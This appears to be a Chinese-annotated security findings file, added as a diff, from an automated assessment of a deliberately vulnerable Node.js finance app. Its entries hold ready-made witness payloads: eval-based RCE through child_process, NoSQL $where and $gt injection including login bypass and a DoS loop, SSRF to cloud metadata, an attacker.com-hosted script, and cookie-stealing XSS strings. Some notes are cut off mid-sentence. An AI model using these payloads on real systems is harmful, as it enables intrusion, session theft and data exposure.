@@ -1,0 +1,235 @@
+{
+ "injection": [
+  {
+   "ID": "INJ-VULN-01",
+   "vulnerability_type": "CommandInjection",
+   "externally_exploitable": false,
+   "source": "req.body.preTax @ app/routes/contributions.js:32",
+   "path": "handleContributionsUpdate(req) → eval(req.body.preTax) @ contributions.js:32",
+   "witness_payload": "process.mainModule.require(\"child_process\").execSync(\"id\").toString()",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "需登录（任意有效账户，可自由注册）。无 CSRF 防护，可链式利用。Node.js 模块包装函数使 eval 可访问 require/process/global。三个 eval 按顺序执行（32→33→34行），任一字段均可独立触发 RCE。"
+  },
+  {
+   "ID": "INJ-VULN-02",
+   "vulnerability_type": "CommandInjection",
+   "externally_exploitable": false,
+   "source": "req.body.afterTax @ app/routes/contributions.js:33",
+   "path": "handleContributionsUpdate(req) → eval(req.body.afterTax) @ contributions.js:33",
+   "witness_payload": "process.mainModule.require(\"child_process\").execSync(\"id\").toString()",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "需登录。三个 eval sink 中的第二个（第 33 行）。即使 preTax 填正常值，afterTax 仍可独立触发 RCE。"
+  },
+  {
+   "ID": "INJ-VULN-03",
+   "vulnerability_type": "CommandInjection",
+   "externally_exploitable": false,
+   "source": "req.body.roth @ app/routes/contributions.js:34",
+   "path": "handleContributionsUpdate(req) → eval(req.body.roth) @ contributions.js:34",
+   "witness_payload": "process.mainModule.require(\"child_process\").execSync(\"id\").toString()",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "需登录。三个 eval sink 中的最后一个（第 34 行）。"
+  },
+  {
+   "ID": "INJ-VULN-04",
+   "vulnerability_type": "SQLi",
+   "externally_exploitable": false,
+   "source": "req.query.threshold @ app/routes/allocations.js:20",
+   "path": "displayAllocations(req) → const {threshold} = req.query @ allocations.js:20 → getByUserIdAndThreshold(userId, threshold) @ allocations.js:23 → $where 字符串插值 @ allocations-dao.js:78 → allocationsCol.find(searchCriteria()) @ allocations-dao.js:86",
+   "witness_payload": "1'; return 1=='1",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "需登录。该 payload 使 $where 对所有文档返回 true，导致全表数据泄露。其他 payload：0';while(true){}'（DoS）、1'; return 1 == '1（布尔盲注区分真假）。userId 参数经 parseInt 安全。注意 /allocations/:userId 还存在 IDOR（userId 取自 req.params 非 session），但那是授"
+  },
+  {
+   "ID": "INJ-VULN-05",
+   "vulnerability_type": "SQLi",
+   "externally_exploitable": true,
+   "source": "req.body.userName @ app/routes/session.js:54",
+   "path": "handleLoginRequest(req) → const {userName} = req.body @ session.js:54 → validateLogin(userName,...) @ session.js:58 → usersCol.findOne({userName: userName}) @ user-dao.js:91-93",
+   "witness_payload": "{\"userName\":{\"$gt\":\"\"},\"password\":\"Admin_123\"}",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "无需认证（公开端点）。userName 注入返回集合中第一个用户文档。若该用户密码为 Admin_123（默认 admin 账户），则实现认证绕过。用户枚举：{\"$gt\":\"\"} 返回用户→'Invalid password'；无匹配→'Invalid username'。signup 路径的 getUserByUserName（user-dao.js:103-106）同样存在操作符注入，但影响有"
+  },
+  {
+   "ID": "INJ-VULN-06",
+   "vulnerability_type": "SQLi",
+   "externally_exploitable": false,
+   "source": "req.query.url @ app/routes/research.js:15",
+   "path": "displayResearch(req) → req.query.url + req.query.symbol 拼接 @ research.js:15 → needle.get(url) @ research.js:16 → res.write(body) @ research.js:25",
+   "witness_payload": "GET /research?symbol=x&url=http://169.254.169.254/latest/meta-data/",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "需登录。两个源（url 和 symbol）中 url 在拼接左侧可控制完整 URL。research-dao.js 为死代码（getBySymbol 未被调用，且 callback 从未执行），不参与数据流。次级风险：SSRF 响应体原样输出到 text/html 页面，可链式反射型 XSS。needle 是否支持 file:// 等非 HTTP 协议未验证（见盲区）。"
+  }
+ ],
+ "xss": [
+  {
+   "ID": "XSS-VULN-01",
+   "vulnerability_type": "Stored",
+   "externally_exploitable": true,
+   "source": "POST body 字段: firstName（注册或更新资料表单）",
+   "path": "req.body.firstName → session.js:194 解构(无编码) → session.js:141 FNAME_RE=/^.{1,100}$/ 仅长度校验 → user-dao.js:22,45 usersCol.insert(原文) → [DB round-trip] → user-dao.js:97-101 getUserById findOne(返回原文) → session.js:266-269 res.render('dashboard',{...doc}) → dashboard.html:1 {% extends layout.html %} → layout.html:75 {{firstName}} (autoescape:false，无编码)",
+   "witness_payload": "firstName=<img src=x onerror=alert(document.cookie)>（注册时植入，每次访问 /、/dashboard、/profile、/contributions 导航栏均触发）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "核弹级 XSS：持久化于 DB，影响所有访问上述 4 个页面的已登录用户。无 CSP（server.js Helmet 被注释），无 HttpOnly cookie 标志（server.js:96 注释），onerror 可直接窃取 connect.sid。双入口：注册（session.js:220）或更新资料（profile.js:82）均可植入。"
+  },
+  {
+   "ID": "XSS-VULN-02",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "POST body 字段: firstName（更新资料表单，bankRouting 验证失败时反射）",
+   "path": "req.body.firstName → profile.js:43 解构(无编码) → profile.js:64 firstNameSafeString = firstName(原值，无编码) → profile.js:65 res.render('profile',{firstNameSafeString,...})(bankRouting 不合规路径) → profile.html:78 <a href=\"{{firstNameSafeString}}\"> (autoescape:false，无 URL 编码)",
+   "witness_payload": "firstName=javascript:alert(document.cookie)&bankRouting=INVALID（bankRouting 不匹配 /([0-9]+)+#/ 触发验证失败路径，渲染 href=\"javascript:alert(document.cookie)\"）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "URL 上下文 XSS 不受 HTML 实体编码影响。变量名 firstNameSafeString 具有误导性（暗示安全，实为原值）。触发需 bankRouting 验证失败（bankRouting 设为不含 # 的值即可）。"
+  },
+  {
+   "ID": "XSS-VULN-03",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "POST body 字段: firstName（更新资料表单，bankRouting 验证失败时反射）",
+   "path": "req.body.firstName → profile.js:43 解构(无编码) → profile.js:64 firstNameSafeString = firstName → profile.js:65 res.render('profile',{firstNameSafeString}) → profile.html:41 value=\"{{firstNameSafeString}}\" (autoescape:false)",
+   "witness_payload": "firstName=\" onmouseover=\"alert(document.cookie)&bankRouting=INVALID（渲染 value=\"\" onmouseover=\"alert(document.cookie)\"，鼠标悬停触发）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "与 XSS-VULN-02 共享同一 source（firstNameSafeString），但 sink 上下文不同（value 属性 vs href URL）。bankRouting 验证失败路径触发。"
+  },
+  {
+   "ID": "XSS-VULN-04",
+   "vulnerability_type": "Stored",
+   "externally_exploitable": true,
+   "source": "POST body 字段: memo（备忘录表单）",
+   "path": "req.body.memo → memos.js:13 addMemos(无编码) → memos-dao.js:15-24 memosCol.insert(原文) → [DB round-trip] → memos-dao.js:28 find({}).sort({timestamp:-1}) → memos.js:25-27 res.render('memos',{memosList:docs}) → memos.html:31 {{ marked(doc.memo) }} (marked 返回 HTML，autoescape:false 不二次转义)",
+   "witness_payload": "<img src=x onerror=alert(document.cookie)>（POST /memos 提交，所有访问 GET /memos 的用户触发）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "marked 0.3.5 sanitize 绕过需 Exploitation 阶段实际验证具体 payload。getAllMemos 的 find({}) 无作者隔离，一次投递全用户触发。marked 注册为 app.locals.marked（server.js:129）模板全局可用。"
+  },
+  {
+   "ID": "XSS-VULN-05",
+   "vulnerability_type": "Stored",
+   "externally_exploitable": true,
+   "source": "POST body 字段: firstName（注册表单）",
+   "path": "req.body.firstName → session.js:194 解构(无编码) → session.js:141 FNAME_RE=/^.{1,100}$/ 仅长度 → user-dao.js:22,45 usersCol.insert(原文) → [DB round-trip] → benefits-dao.js:15-20 find({isAdmin:{$ne:true}}) → benefits.js:15-19 res.render('benefits',{users}) → benefits.html:51 {{user.firstName}} (autoescape:false)",
+   "witness_payload": "firstName=<img src=x onerror=alert(document.cookie)>（注册时植入，所有访问 GET /benefits 的已登录用户触发）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "lastName（benefits.html:52）同构漏洞，source 为 req.body.lastName。isAdmin 守卫被注释放大影响面——任何已登录用户均可访问 /benefits 查看全部用户列表。"
+  },
+  {
+   "ID": "XSS-VULN-06",
+   "vulnerability_type": "Stored",
+   "externally_exploitable": true,
+   "source": "POST body 字段: firstName（注册或更新资料表单）",
+   "path": "req.body.firstName → session.js:194/user-dao.js:22,45 存储(原文) → [DB round-trip] → allocations.js:17 userId=req.params.userId(IDOR) → allocations-dao.js:86 find → allocations-dao.js:94 userDAO.getUserById(alloc.userId) → allocations-dao.js:98 alloc.firstName=user.firstName → allocations.js:25-27 res.render('allocations',{allocations}) → allocations.html:35 {{allocation.firstName}} (autoescape:false)",
+   "witness_payload": "firstName=<img src=x onerror=alert(document.cookie)>（注册植入后，访问 GET /allocations/<攻击者userId> 触发）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "存储型 XSS + IDOR 组合：userId 来自 URL 非会话，可查看任意用户分配数据并触发其 firstName/lastName 中的 payload。"
+  },
+  {
+   "ID": "XSS-VULN-07",
+   "vulnerability_type": "Stored",
+   "externally_exploitable": true,
+   "source": "POST body 字段: lastName（及 ssn、dob、bankAcc、bankRouting、address）",
+   "path": "req.body.lastName → profile.js:44 解构(无编码) → profile-dao.js:49-50 user.lastName=lastName → profile-dao.js:78 users.update($set,原文) → [DB round-trip] → profile-dao.js:94 getByUserId findOne → profile.js:33 res.render('profile',{...doc}) → profile.html:45 value=\"{{lastName}}\" (autoescape:false)。反射路径：bankRouting 验证失败时 profile.js:69 res.render 传入原值。",
+   "witness_payload": "lastName=\" autofocus onfocus=\"alert(document.cookie)&bankRouting=INVALID（反射）；或 lastName=\" autofocus onfocus=\"alert(document.cookie)&bankRouting=12345#（存储，bankRouting 含 # 通过正则）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "6 个字段（lastName@45、ssn@49、dob@53、bankAcc@57、bankRouting@61、address@66）同构漏洞。bankRouting 存储路径需 payload 以 # 结尾通过 /([0-9]+)+#/ 正则。website@70 经 ESAPI.encodeForHTML 编码了 \" 故安全。"
+  },
+  {
+   "ID": "XSS-VULN-08",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "URL 参数: ?url= 和 ?symbol=（控制 needle.get 出站请求目标和路径）",
+   "path": "req.query.url + req.query.symbol → research.js:15 const url = req.query.url + req.query.symbol(无校验) → research.js:16 needle.get(url) → [上游 HTTP 响应 body] → research.js:19 res.writeHead(200,{Content-Type:text/html}) → research.js:25 res.write(body)(无编码)",
+   "witness_payload": "GET /research?symbol=x&url=http://attacker.com/（attacker.com 返回 <script>alert(document.cookie)</script> 作为响应体）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "反射型 XSS + SSRF 复合。攻击者需部署可控 HTTP 服务器。research.html 模板（symbol 为 falsy 时渲染）本身无 {{ }} 用户可控输出。isLoggedIn 中间件保护。"
+  },
+  {
+   "ID": "XSS-VULN-09",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "POST body 字段: userName（登录表单）",
+   "path": "req.body.userName → session.js:55 解构(无编码) → session.js:82/91 res.render('login',{userName:userName})(登录失败路径) → login.html:110 value=\"{{userName}}\" (autoescape:false)",
+   "witness_payload": "userName=\" autofocus onfocus=\"alert(document.cookie)（POST /login 提交，密码错误触发失败路径，渲染 value=\"\" autofocus onfocus=\"alert(document.cookie)\")",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "预认证反射型 XSS（POST /login 无中间件保护）。loginError@101 为静态字符串故安全。password@115 硬编码为空故安全。可用于凭证钓鱼页面伪装。"
+  },
+  {
+   "ID": "XSS-VULN-10",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "POST body 字段: userName（注册表单）",
+   "path": "req.body.userName → session.js:193 解构(无编码) → session.js:202 errors.userName=userName → session.js:214/249 res.render('signup',{...errors}) → signup.html:75 value=\"{{userName}}\" (autoescape:false)",
+   "witness_payload": "userName=\"><svg/onload=alert(1)>（18 字符满足 /^.{1,20}$/，故意使 password!==verify 触发校验失败路径）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "预认证反射型 XSS（POST /signup 无中间件保护）。USER_RE 允许 20 字符内的任意字符。"
+  },
+  {
+   "ID": "XSS-VULN-11",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "POST body 字段: email（注册表单）",
+   "path": "req.body.email → session.js:192 解构(无编码) → session.js:203 errors.email=email → session.js:214/249 res.render('signup',{...errors}) → signup.html:102 value=\"{{email}}\" (autoescape:false)",
+   "witness_payload": "email=\"x@y.z\" autofocus onfocus=alert(1)#（前缀满足 EMAIL_RE，password!==verify 触发校验失败路径）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "预认证反射型 XSS。EMAIL_RE 边界较宽（允许 \" 等），但 payload 需精心构造同时满足正则和属性突破。firstName/lastName/password/verify 不在 errors 对象中（session.js:201-204 仅含 userName 和 email），渲染为空故安全。"
+  },
+  {
+   "ID": "XSS-VULN-12",
+   "vulnerability_type": "Stored",
+   "externally_exploitable": true,
+   "source": "POST body 字段: benefitStartDate（福利表单）",
+   "path": "req.body.benefitStartDate → benefits.js:32 解构(无编码) → benefits.js:35 benefitsDAO.updateBenefits → benefits-dao.js:28 usersCol.update($set,原文) → [DB round-trip] → benefits-dao.js:15-20 find → benefits.js:19 res.render('benefits',{users}) → benefits.html:57 value=\"{{user.benefitStartDate}}\" (autoescape:false)",
+   "witness_payload": "benefitStartDate=\"><script>alert(1)</script>&userId=<目标userId>（POST /benefits，通过 IDOR 修改指定用户，GET /benefits 触发）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "存储型属性突破 XSS + IDOR 写入。利用难度中等（需闭合双引号）。benefitStartDate 原始值可能为服务器随机生成，但 POST /benefits 允许覆盖。"
+  },
+  {
+   "ID": "XSS-VULN-13",
+   "vulnerability_type": "Reflected",
+   "externally_exploitable": true,
+   "source": "URL 路径参数: :userId（GET /allocations/:userId）",
+   "path": "req.params.userId → allocations.js:17 const{userId}=req.params(原始字符串,无编码) → allocations.js:26 res.render('allocations',{userId}) → allocations.html:15 action=\"/allocations/{{userId}}\" (autoescape:false)",
+   "witness_payload": "GET /allocations/1\"><script>alert(1)</script><x%20action=\"（parseInt(\"1\\\">...\")=1 正常查询，模板输出原值突破 action 属性）",
+   "verdict": "vulnerable",
+   "confidence": "needs_review",
+   "notes": "反射型 XSS + IDOR 关联。userId 经 parseInt 用于 DB 查询（返回 userId=1 的数据），但模板渲染原值字符串。URL 路径参数中的特殊字符需 URL 编码（%20 等）。"
+  }
+ ],
+ "ssrf": [
+  {
+   "ID": "SSRF-VULN-01",
+   "vulnerability_type": "URL_Manipulation",
+   "externally_exploitable": true,
+   "confidence": "needs_review",
+   "suggested_exploit_technique": "cloud_metadata_retrieval, internal_service_access",
+   "vulnerable_parameter": "url, symbol",
+   "notes": "非盲 SSRF——上游响应体通过 res.write(body)（research.js:25）原样反射，Content-Type 硬编码为 text/html（research.js:19），同时构成反射型 XSS/内容注入向量。needle 2.2.4 默认跟随重定向（follow_max 默认开启），可用于绕过基于初始 URL 的简单校验。端点受 isLoggedIn 中间件保护，但应用允许"
+  },
+  {
+   "ID": "SSRF-VULN-02",
+   "vulnerability_type": "Open_Redirect",
+   "externally_exploitable": true,
+   "confidence": "needs_review",
+   "suggested_exploit_technique": "open_redirect_domain_bypass",
+   "vulnerable_parameter": "url",
+   "notes": "此为浏览器端 302 重定向（res.redirect 发出 Location 头），非服务端出站请求——服务器本身不获取目标 URL。session.js 中其余 6 个 res.redirect() 调用均使用硬编码路径（'/login'、'/'、'/dashboard'、'/benefits'），已确认安全。端点受 isLoggedIn 中间件保护，但应用允许自助注册。witness_pay"
+  }
+ ]
+}
